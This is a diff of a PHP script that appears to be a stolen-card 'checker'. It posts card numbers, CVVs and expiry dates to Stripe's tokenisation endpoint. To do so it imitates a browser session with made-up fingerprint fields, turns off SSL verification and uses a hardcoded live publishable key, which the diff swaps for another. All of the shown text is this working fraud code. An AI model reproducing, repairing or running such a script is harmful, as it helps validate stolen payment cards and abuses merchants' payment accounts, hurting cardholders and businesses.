@@ -379,7 +379,7 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8f4c1b3a-b718-4354-9f49-529e223673c6172862&muid=9c2f94f4-b3d1-41d6-aefe-873867a6b0fe8514c3&sid=b1029f3a-f5c6-4bca-8cbc-a5c0b036dba3cdd035&pasted_fields=number&payment_user_agent=stripe.js%2F446752a876%3B+stripe-js-v3%2F446752a876&time_on_page=79322&key=pk_live_p3chKFwYavwRRZRTEF136qvf000QsjBDBL');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8f4c1b3a-b718-4354-9f49-529e223673c6172862&muid=9c2f94f4-b3d1-41d6-aefe-873867a6b0fe8514c3&sid=b1029f3a-f5c6-4bca-8cbc-a5c0b036dba3cdd035&pasted_fields=number&payment_user_agent=stripe.js%2F446752a876%3B+stripe-js-v3%2F446752a876&time_on_page=79322&key=pk_live_vDBwegkvQzKsZsPgSnD40s6f&');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
